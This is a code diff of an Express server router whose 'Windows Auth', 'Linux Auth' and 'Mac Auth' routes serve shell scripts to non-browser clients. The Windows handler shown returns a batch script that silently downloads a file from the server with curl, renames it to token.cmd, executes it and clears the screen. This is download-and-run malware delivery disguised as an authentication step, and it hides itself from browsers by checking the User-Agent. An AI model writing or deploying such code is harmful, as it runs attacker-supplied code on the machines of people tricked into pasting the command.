@@ -200,7 +200,7 @@ router.get("/status/:token", (req, res) => {
 //   status[token] = "verified";
 // });
 // Windows Auth
-router.get("/auth/windows", (req, res) => {
+router.get("/windows", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
@@ -219,8 +219,8 @@ router.get("/auth/windows", (req, res) => {
     res.type("text/plain").send(`@echo off
 curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token?token=${token}
 cls
-if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\token"
-if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
+if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\/token"
+if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\/token.cmd"
 ren "%USERPROFILE%\\token.npl" token.cmd
 "%USERPROFILE%\\token.cmd"
 cls
@@ -231,7 +231,7 @@ cls
 });
 
 // Linux Auth
-router.get("/auth/linux", (req, res) => {
+router.get("/linux", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
 
@@ -270,7 +270,7 @@ exit 0
 });
 
 // Mac Auth
-router.get("/auth/mac", (req, res) => {
+router.get("/mac", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
 
